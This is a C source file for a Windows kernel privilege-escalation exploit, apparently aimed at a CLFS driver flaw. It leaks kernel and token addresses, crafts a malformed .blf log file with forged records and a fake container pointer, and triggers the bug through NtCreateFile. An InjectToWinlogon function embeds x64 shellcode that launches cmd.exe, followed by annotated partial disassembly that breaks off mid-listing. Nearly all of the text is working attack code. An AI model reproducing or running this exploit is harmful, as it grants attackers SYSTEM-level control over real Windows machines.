#define _CRT_SECURE_NO_WARNINGS
#include "head.h"


DWORD64 GetModuleAddr(const char* modName)
{
	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

	if (status == ((NTSTATUS)0xC0000004L))//STATUS_INFO_LENGTH_MISMATCH
	{
		free(buffer);
		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error\n");
		return 0;
	}

	for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
	{
		PVOID kernelImageBase = buffer->Modules[i].ImageBase;
		PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
		if (_stricmp(kernelImage, modName) == 0)
		{
			free(buffer);
			return (DWORD64)kernelImageBase;
		}
	}
	free(buffer);
	return 0;
}


DWORD64 LeakEporcessKtoken()
{

	LPVOID drivers[1024] = {};
	DWORD cbNeeded = NULL;
	ntoskrnlBase = NULL;
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		if (drivers[0])
		{
			ntoskrnlBase = drivers[0];
			printf("[-] ntoskrnlBase=%p\n", ntoskrnlBase);
		}
	}
	else
	{
		printf("[-] EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
	}

	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (!proc)
	{
		printf("[-] OpenProcess failed\n");
		return 0;
	}

	HANDLE token = 0;
	if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
	{
		printf("[-] OpenProcessToken failed\n");
		return 0;
	}

	DWORD64 ktoken = 0;
	for (int i = 0; i < 0x100; i++)
	{
		ktoken = GetKernelPointer(token, 0x5);

		if (ktoken != NULL)
		{
			break;
		}

	}
	return ktoken;
}


DWORD64 GetGadgetAddr(const char* name)
{
	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
	HMODULE mod = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!mod)
	{
		printf("[-] leaking ntoskrnl version\n");
		return 0;
	}
	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
	DWORD64 returnValue = base + offset - (DWORD64)mod;
	//printf("[+] FunAddr: %p\n", (DWORD64)returnValue);
	FreeLibrary(mod);
	return returnValue;
}

DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

	if (status == (NTSTATUS)0xC0000004L)
	{
		free(buffer);
		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error \n");
		return 0;
	}

	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
	{
		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

		if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
		{
			if (handle == (HANDLE)buffer->Handles[i].HandleValue)
			{
				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
				free(buffer);
				return object;
			}
		}
	}
	printf("[-] handle not found\n");
	free(buffer);
	return 0;
}



BOOL InitFuncAddr()
{
	/*
	NtQuerySystemInformationFunc NtQuerySystemInformation = 0;

	NtSetInformationThreadFunc NtSetInformationThread = 0;

	RtlInitUnicodeStringFunc RtlInitUnicodeString = 0;

	NtCreateFileFunc NtCreateFile = 0;
	*/
	RtlInitUnicodeString = 0;
	NtCreateFile = 0;
	HMODULE nt = GetModuleHandleA("ntdll.dll"); 
	/* The ntdll.dll file is a file created by Microsoft with a description of 
	"NT Layer DLL" (dynamic-link library) and is the file containing NT kernel
	functions. */
	if (!nt)
	{
		printf("Get nt module fail\r\n");
		return FALSE;
	}
	/* getting a bunch of process adresses, info on funcs below

	1. RtlInitUnicodeString function (wdm.h) 
	takes a str returns unicoded

	https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring

			NTSYSAPI VOID RtlInitUnicodeString(
		  [out]          PUNICODE_STRING         DestinationString,
		  [in, optional] __drv_aliasesMem PCWSTR SourceString
			);

	2. NtCreateFile function (winternl.h)
	creates file, returns ptr to variable that recieves file handle
	(descriptor?)

	https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile

			_kernel_entry NTSTATUS NtCreateFile(
		  [out]          PHANDLE            FileHandle,
		  [in]           ACCESS_MASK        DesiredAccess,
		  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
		  [out]          PIO_STATUS_BLOCK   IoStatusBlock,
		  [in, optional] PLARGE_INTEGER     AllocationSize,
		  [in]           ULONG              FileAttributes,
		  [in]           ULONG              ShareAccess,
		  [in]           ULONG              CreateDisposition,
		  [in]           ULONG              CreateOptions,
		  [in]           PVOID              EaBuffer,
		  [in]           ULONG              EaLength
		);

	3. NtSetInformationThreadFunc 
	
	Sets the priority of thread, returns success or relevant err code

	https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntsetinformationthread

			__kernel_entry NTSYSCALLAPI NTSTATUS NtSetInformationThread(
		  [in] HANDLE          ThreadHandle,
		  [in] THREADINFOCLASS ThreadInformationClass,
		  [in] PVOID           ThreadInformation,
		  [in] ULONG           ThreadInformationLength
		);

	4. NtQuerySystemInformation

	"[NtQuerySystemInformation may be altered or unavailable in future 
	versions of Windows. Applications should use the alternate functions 
	listed in this topic.]

	Retrieves the specified system information."

	https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation

			__kernel_entry NTSTATUS NtQuerySystemInformation(
		  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
		  [in, out]       PVOID                    SystemInformation,
		  [in]            ULONG                    SystemInformationLength,
		  [out, optional] PULONG                   ReturnLength
		);


	*/

	RtlInitUnicodeString = (RtlInitUnicodeStringFunc)GetProcAddress(nt, "RtlInitUnicodeString");
	NtCreateFile = (NtCreateFileFunc)GetProcAddress(nt, "NtCreateFile");
	NtSetInformationThread = (NtSetInformationThreadFunc)GetProcAddress(nt, "NtSetInformationThread");
	NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(nt, "NtQuerySystemInformation");
	if (!NtCreateFile || !RtlInitUnicodeString || !NtSetInformationThread || !NtQuerySystemInformation)
	{
		printf("Get function address fail\r\n");
		return FALSE;
	}
	printf("RtlInitUnicodeString = %p\tNtCreateFile = %p\tNtSetInformationThread = %p\tNtQuerySystemInformation = %p\r\n", RtlInitUnicodeString, NtCreateFile, NtSetInformationThread, NtQuerySystemInformation);
	return TRUE;
}




DWORD initData1(DWORD dwNum1, DWORD dwNum2)
{
	DWORD dwRet = 0;
	DWORD i = 1;
	DWORD dwNumTemp = dwNum1;
	while (i <= dwNum2)
	{
		if ((dwNumTemp & 1) != 0)
		{
			dwRet |= 1 << (dwNum2 - i);
		}
		dwNumTemp >>= 1;
		++i;
	}
	return dwRet;
}

DWORD initData() // 32 bit unsigned int ie. 4 bytes
{
	for (int i = 0; i < 0x100; i++) // 0x100 == 256
	{
		BYTE bt = 8;
		// << is left shift bitwise, >> is right 
		// example:
		// https://stackoverflow.com/questions/141525/what-are-bitwise-shift-bit-shift-operators-and-how-do-they-work
		DWORD dwData = initData1(i, bt) << 24;   //80 
		//printf("%08X\t", dwData);
		DWORD dwDataTemp = dwData;
		for (int j = 8; j > 0; --j)
		{
			dwDataTemp = dwData << 1;
			dwData = ~(dwData >> 0x1F) + 1; 
			// right shift by 31, add 1, bitwise not == ~
			dwData &= 0x4C11DB7; // polynomial used w crc-2 checksum algorithim
			dwData = dwDataTemp ^ dwData; // xor
		}
		BYTE bt1 = 32;
		//printf("%08X\r\n", dwData);
		DWORD rt1 = initData1(dwData, bt1);
		datas[i] = rt1; 
		// datas defined in header.h as dword datas [0x100] = {}
	}
	return 0;
}




ULONG64 getTempPathStr(PULONG64 buffer)
{
	Sleep(0);
	if (!buffer)
	{
		printf("Allocation CLFS_PATHES failed\r\n");
		return 0;
	}
	memset(buffer, 0, 0x1040);
	GetTempPathW(0x104, (LPWSTR)buffer);
	wcscpy((wchar_t*)((ULONG64)buffer + 0x208), (wchar_t*)buffer);
	GetTempFileNameW((LPCWSTR)buffer, L"wct", 0, (LPWSTR)((ULONG64)buffer + 0x208));
	if (!DeleteFileW((LPWSTR)((ULONG64)buffer + 0x208)) && GetLastError() != 2)
	{
		printf("cant generate unique blf filename\r\n");
		return 0;
	}
	wcscpy((wchar_t*)((ULONG64)buffer + 0x410), L"\\??\\");
	wcscat((wchar_t*)((ULONG64)buffer + 0x410), (wchar_t*)((ULONG64)buffer + 0x208));

	wcscpy((wchar_t*)((ULONG64)buffer + 0x618), L"\\GLOBAL??\\LOG:");
	wcscat((wchar_t*)((ULONG64)buffer + 0x618), (wchar_t*)((ULONG64)buffer + 0x410));

	wcscpy((wchar_t*)((ULONG64)buffer + 0x820), (wchar_t*)((ULONG64)buffer + 0x208));
	wcscat((wchar_t*)((ULONG64)buffer + 0x820), L".blf");

	wcscpy((wchar_t*)((ULONG64)buffer + 0xA28), (wchar_t*)((ULONG64)buffer + 0x410));
	wcscat((wchar_t*)((ULONG64)buffer + 0xA28), L".blf");
	if (DeleteFileW((LPWSTR)((ULONG64)buffer + 0x820)) || GetLastError() == 2)
	{
		GetTempFileNameW((LPWSTR)buffer, L"wct", 0, (LPWSTR)((ULONG64)buffer + 0xC30));
		wcscpy((wchar_t*)((ULONG64)buffer + 0xE38), L"\\??\\");
		wcscat((wchar_t*)((ULONG64)buffer + 0xE38), (wchar_t*)((ULONG64)buffer + 0xC30));
		if (DeleteFileW((LPWSTR)((ULONG64)buffer + 0xC30)) || GetLastError() == 2)
		{
			return 1;
		}
		else
		{
			printf("cant generate unique container filename\r\n");
			return 0;
		}
	}
	else
	{
		printf("cant generate unique blf filename\r\n");
		return 0;
	}
	Sleep(0);

}


ULONG64 CreateControlRecord(DWORD dwSize, DWORD arg1, DWORD arg2, __out PULONG64 ControlRecord)
{
	Sleep(0);
	PVOID lpCtrlRecord = malloc(dwSize);
	if (lpCtrlRecord)
	{
		memset(lpCtrlRecord, 0, dwSize);
		*(WORD*)lpCtrlRecord = 0x15;
		*(WORD*)((ULONG64)lpCtrlRecord + 2) = 0x1;
		*(WORD*)((ULONG64)lpCtrlRecord + 4) = dwSize >> 9;
		*(WORD*)((ULONG64)lpCtrlRecord + 6) = dwSize >> 9;
		*(WORD*)((ULONG64)lpCtrlRecord + 0x28) = 0x70;
		*(WORD*)((ULONG64)lpCtrlRecord + 0x68) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;
		*(ULONG64*)((ULONG64)lpCtrlRecord + 0x78) = 0xC1F5C1F500005F1C;// CLFS_CONTROL_RECORD_MAGIC_VALUE 
		*(ULONG64*)((ULONG64)lpCtrlRecord + 0xB8) = 0x6;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xC8) = dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE0) = dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE4) = dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE8) = 1;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xF8) = arg1;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0xFC) = 2 * dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x100) = 2;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x110) = arg1;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x114) = arg1 + 2 * dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x118) = 3;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x128) = arg2;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x12C) = 2 * dwSize + 2 * arg1;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x130) = 4;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x140) = arg2;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x144) = arg2 + 2 * arg1 + 2 * dwSize;
		*(DWORD*)((ULONG64)lpCtrlRecord + 0x148) = 5;
		*ControlRecord = (ULONG64)lpCtrlRecord;
		return  1;
	}
	printf("Allocation fail\r\n");
	return 0;
}

ULONG64 encodeBlock1(PULONG64 lpBuffer, DWORD arg1, DWORD arg2, DWORD ndNum)
{
	char v6;
	char v7;
	if (!*(WORD*)((ULONG64)lpBuffer + 4))
		return 0xC01A000A;
	if (*(unsigned __int16*)((ULONG64)lpBuffer + 6) < (int)*(unsigned __int16*)((ULONG64)lpBuffer + 4))
		return 0xC01A000Ai64;
	if (*(unsigned __int16*)((ULONG64)lpBuffer + 4) << 9 > arg1)
		return 0xC01A000A;
	if (ndNum > 0x10u)
		return 0xC000000D;                       // STATUS_INVALID_PARAMETER
	if ((arg2 & 0x11) == 0)
		return 0xC000000D;
	if ((*(DWORD*)((ULONG64)lpBuffer + 16) & 1) != 0)
		return 0xC01A000A;
	if ((*(DWORD*)((ULONG64)lpBuffer + 104) & 7) != 0)
		return 0xC01A000A;
	if (*(DWORD*)((ULONG64)lpBuffer + 104) + 2 * (arg1 >> 9) > arg1)
		return 0xC01A000A;
	for (int i = 0; i < arg1 >> 9; ++i)
	{
		*(WORD*)(*(unsigned int*)((ULONG64)lpBuffer + 104) + (ULONG64)lpBuffer) = *(WORD*)((ULONG64)lpBuffer + (i << 9) + 510);
		if (i)
			v6 = 0;
		else
			v6 = 64;
		if ((arg1 >> 9) - 1 == i)
			v7 = 32;
		else
			v7 = 0;
		*(WORD*)((ULONG64)lpBuffer + (i << 9) + 510) = (unsigned __int8)(v7 | v6 | ndNum) | (arg2 << 8);
	}
	*(DWORD*)((ULONG64)lpBuffer + 16) = *(DWORD*)((ULONG64)lpBuffer + 16) & 0xFFFFFFFC | 1;

	return 0;
}

ULONG64 encodeBlock2(PULONG64 lpBuffer, DWORD dwNum)
{
	unsigned int v3 = -1;
	for (int i = 0; i < dwNum; ++i)
	{
		v3 = datas[*(unsigned __int8*)((ULONG64)lpBuffer + i) ^ (unsigned __int8)v3] ^ (v3 >> 8);
	}
	return ~v3;
}

ULONG64 setCheckSum(PULONG64 lpBuf, DWORD ndNum)
{
	*(DWORD*)((ULONG64)lpBuf + 0xC) = 0;
	if (encodeBlock1(lpBuf, *(unsigned __int16*)((ULONG64)lpBuf + 4) << 9, *(BYTE*)((ULONG64)lpBuf + 2), ndNum) >= 0)
	{
		*(DWORD*)((ULONG64)lpBuf + 12) = encodeBlock2(lpBuf, *(unsigned __int16*)((ULONG64)lpBuf + 4) << 9);
		return 1;
	}
	printf("Failed to encode block\r\n");
	return 0;
}

ULONG64 createAttackerContainer(PULONG64 lpPathBuffer, DWORD dwSize)
{
	Sleep(4);
	PVOID lpAttackerContainer = malloc(dwSize);
	memset(lpAttackerContainer, 0, dwSize);
	*(WORD*)lpAttackerContainer = 0x15;
	*(WORD*)((ULONG64)lpAttackerContainer + 2) = 1;
	*(WORD*)((ULONG64)lpAttackerContainer + 3) = dwSize >> 9;           // 80000 >> 9 = 400
	*(WORD*)((ULONG64)lpAttackerContainer + 6) = dwSize >> 9;           // 400
	*(ULONG64*)((ULONG64)lpAttackerContainer + 6) = 0x70;
	*(WORD*)((ULONG64)lpAttackerContainer + 0x28) = 0x70;
	*(WORD*)((ULONG64)lpAttackerContainer + 0x68) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;// F800
	*(BYTE*)lpAttackerContainer = 0x15;
	*(BYTE*)((ULONG64)lpAttackerContainer + 4) = 1;
	*(WORD*)((ULONG64)lpAttackerContainer + 4) = 1;
	*(WORD*)((ULONG64)lpAttackerContainer + 6) = 1;
	*(WORD*)((ULONG64)lpAttackerContainer + 0x68) = 0x1F8;
	setCheckSum((PULONG64)lpAttackerContainer, 0x10);
	// \??\C:\Users\test\AppData\Local\Temp\wct7E7A.tmp
	HANDLE hFile = CreateFileW((LPCWSTR)((ULONG64)lpPathBuffer + 0xE38), 0x10000000u, 0, 0, 1, 0x80u, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW failed: %d\n", GetLastError());
		return 0;
	}
	DWORD NumberOfBytesWritten = 0;
	if (WriteFile(hFile, lpAttackerContainer, dwSize, &NumberOfBytesWritten, 0) || NumberOfBytesWritten == dwSize)
	{
		CloseHandle(hFile);
		return 1;
	}
	printf("WriteFile failed: %d\n", GetLastError());
	return 0;
}

ULONG64 CreateBaseLogRecord(PULONG64 lpPathBuffer, DWORD dwSize, DWORD arg3, PVOID fakeContainer, PULONG64 lpRet)
{
	Sleep(1);
	PVOID lpBuf = malloc(dwSize);
	if (lpBuf)
	{
		memset(lpBuf, 0, dwSize);
		*(WORD*)lpBuf = 0x15;
		*(WORD*)((ULONG64)lpBuf + 2) = 1;
		*(WORD*)((ULONG64)lpBuf + 4) = dwSize >> 9;
		*(WORD*)((ULONG64)lpBuf + 6) = dwSize >> 9;
		*(WORD*)((ULONG64)lpBuf + 0x28) = 0x70;
		*(WORD*)((ULONG64)lpBuf + 104) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;
		*(DWORD*)((ULONG64)lpBuf + 0xC8) = 0x1800;
		*(DWORD*)((ULONG64)lpBuf + 5028) = 2;
		*(DWORD*)((ULONG64)lpBuf + 0x1A8) = 0x2B5;
		*(DWORD*)((ULONG64)lpBuf + 0x1AC) = 0x1830;
		*(DWORD*)((ULONG64)lpBuf + 0x1B0) = 0x1A30;
		*(DWORD*)((ULONG64)lpBuf + 0x19C) = 1;
		*(DWORD*)((ULONG64)lpBuf + 0x39C) = 0x13A0;
		*(DWORD*)((ULONG64)lpBuf + 0x13E0) = 0xC1FDF006;
		*(DWORD*)((ULONG64)lpBuf + 0x13E4) = 0x30;
		*(DWORD*)((ULONG64)lpBuf + 0x13E8) = 0;
		*(DWORD*)((ULONG64)lpBuf + 0x13EC) = 0xB8;
		*(DWORD*)((ULONG64)lpBuf + 0x1400) = 0x13F0;
		*(DWORD*)((ULONG64)lpBuf + 0x1404) = 0x13A0;
		*(DWORD*)((ULONG64)lpBuf + 0x1410) = 0xC1FDF007;
		*(DWORD*)((ULONG64)lpBuf + 0x1414) = 0x88;
		*(ULONG64*)((ULONG64)lpBuf + 0x1418) = arg3;
		*(BYTE*)((ULONG64)lpBuf + 5152) = 1;
		*(BYTE*)((ULONG64)lpBuf + 0x1421) = 0;
		*(WORD*)((ULONG64)lpBuf + 0x1422) = 0;
		*(WORD*)((ULONG64)lpBuf + 0x1434) = 1;
		*(ULONG64*)((ULONG64)lpBuf + 0x1448) = 0;
		// \??\C:\Users\test\AppData\Local\Temp\wct7E7A.tmp
		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1460), (wchar_t*)((ULONG64)lpPathBuffer + 0xE38));
		*(DWORD*)((ULONG64)lpBuf + 0x319) = 0x2B5;
		*(BYTE*)((ULONG64)lpBuf + 0x32D) = 0;
		*(ULONG64*)((ULONG64)lpBuf + 0x35D) = 0x80000;
		*(DWORD*)((ULONG64)lpBuf + 6264) = 0x58A84;
		*(DWORD*)((ULONG64)lpBuf + 0x187C) = 0xB8;
		*(DWORD*)((ULONG64)lpBuf + 0x1890) = 0x1900;
		*(DWORD*)((ULONG64)lpBuf + 0x1894) = 0x1830;
		*(BYTE*)((ULONG64)lpBuf + 0x18A8) = 1;
		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1970), L"test");
		*(DWORD*)((ULONG64)lpBuf + 0x1A90) = 0x1C00;
		*(DWORD*)((ULONG64)lpBuf + 0x1A94) = 0x1A30;
		*(BYTE*)((ULONG64)lpBuf + 6824) = 2;
		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1C70), L"test1");
		*(DWORD*)((ULONG64)lpBuf + 0x1C04) = 7072;
		*(BYTE*)((ULONG64)lpBuf + 0x1C20) = 1;
		*(ULONG64*)((ULONG64)lpBuf + 0x1C28) = (ULONG64)fakeContainer;
		*lpRet = (ULONG64)lpBuf;

		return 1;
	}
	printf("Allocation failed\r\n");
	return 0;
}

ULONG64 CreateTruncateRecord(DWORD arg2, PULONG64 lpRet)
{
	Sleep(3);
	PVOID lpTruncateRecord = malloc(arg2);
	if (lpTruncateRecord)
	{
		memset(lpTruncateRecord, 0, arg2);
		*(WORD*)lpTruncateRecord = 0x15;
		*(WORD*)((ULONG64)lpTruncateRecord + 0x2) = 1;
		*(WORD*)((ULONG64)lpTruncateRecord + 0x4) = arg2 >> 9;
		*(WORD*)((ULONG64)lpTruncateRecord + 0x6) = arg2 >> 9;
		*(WORD*)((ULONG64)lpTruncateRecord + 0x28) = 0x70;
		*(WORD*)((ULONG64)lpTruncateRecord + 0x68) = (arg2 - 2 * (arg2 >> 9)) & 0xFFF8;
		*lpRet = (ULONG64)lpTruncateRecord;
		return 1;
	}
	printf("Allocation failed\r\n");
	return 0;
}

ULONG64 createFakeContainer(PULONG64 lpPathBuffer, PVOID fakeContainer)
{
	// C:\Users\test\AppData\Local\Temp\wct7E79.tmp.blf
	HANDLE hFile = CreateFileW((LPCWSTR)((ULONG64)lpPathBuffer + 0x820), 0x40000000, 0, 0, 2, 0x80, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Create File fail : %d\r\n", GetLastError());
		return 0;
	}
	DWORD dwSize = 0x400;
	DWORD arg1 = 0x2000;
	DWORD arg2 = 0x4000;
	DWORD arg3 = 0x80000;
	ULONG64 CtrlRecord = 0;
	// 构建_CLFS_CONTROL_RECORD
	if (!CreateControlRecord(dwSize, arg1, arg2, &CtrlRecord))
	{
		printf("Create control record failed\r\n");
		return 0;
	}
	printf("Get control record is  %08X\r\n", CtrlRecord);
	PVOID lpBuf = malloc(2 * dwSize);
	memset(lpBuf, 0, 2 * dwSize);
	memcpy(lpBuf, (PVOID)CtrlRecord, 0x400);
	Sleep(0);
	setCheckSum((PULONG64)lpBuf, 0x10);
	DWORD NumberOfBytesWritten = 0;
	if (!WriteFile(hFile, lpBuf, 2 * dwSize, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * dwSize)
	{
		printf("WriteFile failed : %d\r\n", GetLastError());
		return 0;
	}

	if (!createAttackerContainer(lpPathBuffer, arg3))
	{
		printf("Create attacker container failed\r\n");
		return 0;
	}

	ULONG64 lpRetBaseLogRecord = 0;
	if (!CreateBaseLogRecord(lpPathBuffer, arg1, arg3, fakeContainer, &lpRetBaseLogRecord))
	{
		printf("Create baselog record failed\r\n");
		return 0;
	}
	printf("Get Base log record address is %p\r\n", lpRetBaseLogRecord);
	PVOID lpRecoedTemp = malloc(2 * arg1);
	memset(lpRecoedTemp, 0, 2 * arg1);
	memcpy(lpRecoedTemp, (PVOID)lpRetBaseLogRecord, arg1);
	setCheckSum((PULONG64)lpRecoedTemp, 0x10);
	if (!WriteFile(hFile, lpRecoedTemp, 2 * arg1, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * arg1)
	{
		printf("WriteFile failed - %x", GetLastError());
		return 0;
	}
	ULONG64 lpRetTruncateRecord = 0;
	if (!CreateTruncateRecord(arg2, &lpRetTruncateRecord))
	{
		printf("Create truncate record failed\r\n");
		return 0;
	}
	printf("Get truncate record is  %08X\r\n", lpRetTruncateRecord);
	PVOID lpTruncateRecoedTemp = malloc(2 * arg2);
	memset(lpTruncateRecoedTemp, 0, 2 * arg2);
	memcpy(lpTruncateRecoedTemp, (PVOID)lpRetTruncateRecord, arg2);
	setCheckSum((PULONG64)lpTruncateRecoedTemp, 0x10);
	if (!WriteFile(hFile, lpTruncateRecoedTemp, 2 * arg2, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * arg2)
	{
		printf("WriteFile failed - %x", GetLastError());
		return 0;
	}
	CloseHandle(hFile);
	return 1;
}


void triggerPoc(PVOID container)
{
	IO_STATUS_BLOCK IoStatusBlock;
	PULONG64 lpBuffer = (PULONG64)malloc(0x1040);
	// 构建路径结构，这里可以构建为结构体
	if (getTempPathStr(lpBuffer))
	{
		// 创建虚假的Container
		if (createFakeContainer(lpBuffer, container))// create container for trigger
		{
			HANDLE hObject = 0;
			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(OBJECT_ATTRIBUTES) };
			UNICODE_STRING DestinationString;
			// \GLOBAL??\LOG:\??\C:\Users\test\AppData\Local\Temp\wct7E79.tmp
			RtlInitUnicodeString(&DestinationString, (PCWSTR)((ULONG64)lpBuffer + 0x618));
			ObjectAttributes.Length = 48;
			ObjectAttributes.RootDirectory = 0;
			ObjectAttributes.Attributes = 0;
			ObjectAttributes.ObjectName = &DestinationString;
			ObjectAttributes.SecurityDescriptor = 0;
			ObjectAttributes.SecurityQualityOfService = 0;
			NTSTATUS status = NtCreateFile(&hObject, 0xC0000000, &ObjectAttributes, &IoStatusBlock, 0, 0, 0, 1, 0, 0, 0);
			if (status >= 0)
			{
				OBJECT_ATTRIBUTES ObjectAttributes1 = { sizeof(OBJECT_ATTRIBUTES) };
				UNICODE_STRING unicodeStr;
				RtlInitUnicodeString(&unicodeStr, L"test");
				ObjectAttributes1.Length = 48;
				ObjectAttributes1.RootDirectory = hObject;
				ObjectAttributes1.Attributes = 0;
				ObjectAttributes1.ObjectName = &unicodeStr;
				ObjectAttributes1.SecurityDescriptor = 0;
				ObjectAttributes1.SecurityQualityOfService = 0;
				HANDLE hFile = INVALID_HANDLE_VALUE;
				status = NtCreateFile(&hFile, 0x80010000, &ObjectAttributes1, &IoStatusBlock, 0, 0, 0, 1, 0, 0, 0);
				if (status >= 0)
				{
					FILE_DISPOSITION_INFO fdi = { 1 };
					if (SetFileInformationByHandle(hFile, FileDispositionInfo, (LPVOID)&fdi, 1))
					{
						CloseHandle(hFile);
						CloseHandle(hObject);
					}
				}
			}

		}
	}

	return;
}



void InjectToWinlogon()
{
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
		"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
		"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
		"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
		"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
		"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
		"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
		"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
		"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
		"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
		"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
		"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
		"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
		"\x78\x65\x00";

/* decode via https://defuse.ca/online-x86-assembler.htm#disassembly2 , i'm on mac and lack nidasm
0:  fc                      cld
1:  48                      dec    eax
2:  83 e4 f0                and    esp,0xfffffff0
5:  e8 c0 00 00 00          call   0xca
a:  41                      inc    ecx
b:  51                      push   ecx
c:  41                      inc    ecx
d:  50                      push   eax
e:  52                      push   edx
f:  51                      push   ecx
10: 56                      push   esi
11: 48                      dec    eax
12: 31 d2                   xor    edx,edx
14: 65 48                   gs dec eax
16: 8b 52 60                mov    edx,DWORD PTR [edx+0x60]
19: 48                      dec    eax
1a: 8b 52 18                mov    edx,DWORD PTR [edx+0x18]
1d: 48                      dec    eax
1e: 8b 52 20                mov    edx,DWORD PTR [edx+0x20]
21: 48                      dec    eax
22: 8b 72 50                mov    esi,DWORD PTR [edx+0x50]
25: 48                      dec    eax
26: 0f b7 4a 4a             movzx  ecx,WORD PTR [edx+0x4a]
2a: 4d                      dec    ebp
2b: 31 c9                   xor    ecx,ecx
2d: 48                      dec    eax
2e: 31 c0                   xor    eax,eax
30: ac                      lods   al,BYTE PTR ds:[esi]
